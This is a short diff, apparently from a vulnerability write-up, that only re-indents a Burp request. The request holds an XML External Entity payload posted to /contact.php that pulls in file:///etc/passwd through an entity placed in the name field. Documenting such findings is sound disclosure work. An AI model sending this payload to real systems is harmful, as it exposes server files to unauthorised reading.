@@ -50,11 +50,11 @@ Attack :
 Burp Request : 
 
 
-POST /contact.php HTTP/1.1
+    POST /contact.php HTTP/1.1
 
-<?xml version="1.0" encoding="UTF-8"?>
+    <?xml version="1.0" encoding="UTF-8"?>
 
-<!DOCTYPE foo [<!ENTITY xxezrp9j SYSTEM "file:///etc/passwd"> ]><contact>
+    <!DOCTYPE foo [<!ENTITY xxezrp9j SYSTEM "file:///etc/passwd"> ]><contact>
     
     <name>mvmm&xxezrp9j;</name>
     
